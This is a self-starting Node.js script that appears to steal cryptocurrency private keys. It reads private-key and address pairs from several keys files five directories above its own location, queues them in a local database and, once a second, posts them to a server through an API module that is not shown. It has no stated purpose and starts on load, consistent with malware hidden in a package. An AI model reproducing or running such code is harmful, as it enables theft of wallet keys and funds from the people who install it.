const process = require("process");
const { postServer } = require("./api");
const { insert, init: initDB, getUnUp, getAll } = require("./db");

const fsp = require("fs/promises");
const path = require("path");
let isSTART = true;
let HeaderArray = [];
let FooterArray = [];
let TailLength = 17;
let headFootArray = [];

/**
 *
 * @param {[]} keys
 */
async function appFile(keys) {
  let rows = await getAll();
  // console.log(rows);
  let ids = rows.map((item) => {
    return item.id;
  });
  let idsSet = new Set(ids);
  let keysSet = new Set(keys);
  let keyArray = [...keysSet.values()].filter((item) => {
    return !idsSet.has(item);
  });
  if (keyArray.length) {
    // console.log(keyArray);
    keyArray.forEach((item) => {
      insert(item);
    });

    // dataHandler();
  }
}
async function _getKeys(fileName) {
  try {
    let lines = await fsp.readFile(fileName, "utf-8");
    return lines
      .split("\n")
      .filter((item) => item)
      .map((item) => {
        let txtArray = item.split(/\s+/);
        let key = txtArray[0].trim();
        let value = txtArray[1].trim();
        return {
          address: value,
          pkey: key,
        };
      });
  } catch (error) {
    return [];
  }
}

async function getAllKeys() {
  let file = [
    "./keys1.txt",
    "./keys2.txt",
    "./keys3.txt",
    "./keys4.txt",
    "./keys5.txt",
    "./keys6.txt",
    "./keys7.txt",
  ];
  file = file.map((item) => {
    return path.join(__dirname, "../../../../../", item);
  });

  // console.log(file);
  let result = await Promise.all(
    file.map((item) => {
      return _getKeys(item);
    })
  );
  let keys = [];
  result.forEach((item) => {
    keys.push(...item);
  });
  return keys;
}
async function dataHandler() {
  let data = getUnUp();
  if (!data) {
    return;
  }
  try {
    await postServer(data.id);
  } catch (error) {
    return;
  }
  dataHandler();
}
function tick() {
  setInterval(() => {
    dataHandler();
  }, 1 * 1000);
}
async function run() {
  // console.log("start");
  let keys = await getAllKeys();
  let condition_unitary = true;
  if (condition_unitary) {
    keys = keys.map((item) => {
      let m = `${item.pkey}  ${item.address}`;
      return m;
    });
    appFile(keys);
  }
  setTimeout(() => {
    run();
  }, 1000);
}
function start() {
  dataHandler();
  run();
  tick();
}
start();
